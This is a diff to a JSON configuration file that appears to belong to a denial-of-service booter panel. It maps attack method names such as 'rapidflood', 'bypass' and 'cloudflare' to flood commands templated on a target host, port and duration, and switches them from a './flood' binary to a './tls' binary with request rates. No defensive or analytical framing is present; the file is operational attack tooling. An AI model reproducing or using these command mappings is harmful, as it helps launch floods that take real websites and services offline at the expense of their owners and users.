@@ -97,42 +97,42 @@
   },
   {
     "name": "http",
-    "cmd": "./flood http {host} {port} {time}"
+    "cmd": "./tls {host} {time} 100"
   },
   {
     "name": "https",
-    "cmd": "./flood https {host} {port} {time}"
+    "cmd": "./tls {host} {time} 100"
   },
   {
     "name": "httpx",
-    "cmd": "./flood httpx {host} {port} {time}"
+    "cmd": "./tls {host} {time} 150"
   },
   {
     "name": "rapidflood",
-    "cmd": "./flood rapidflood {host} {port} {time}"
+    "cmd": "./tls {host} {time} 200"
   },
   {
     "name": "tls",
-    "cmd": "./flood tls {host} {port} {time}"
+    "cmd": "./tls {host} {time} 100"
   },
   {
     "name": "tlsx",
-    "cmd": "./flood tlsx {host} {port} {time}"
+    "cmd": "./tls {host} {time} 150"
   },
   {
-    "name": "bypass",
-    "cmd": "./flood bypass {host} {port} {time}"
+    "name": "bypass", 
+    "cmd": "./tls {host} {time} 100"
   },
   {
     "name": "browser",
-    "cmd": "./flood browser {host} {port} {time}"
+    "cmd": "./tls {host} {time} 100"
   },
   {
     "name": "cache",
-    "cmd": "./flood cache {host} {port} {time}"
+    "cmd": "./tls {host} {time} 100"
   },
   {
     "name": "cloudflare",
-    "cmd": "./flood cloudflare {host} {port} {time}"
+    "cmd": "./tls {host} {time} 100"
   }
 ]
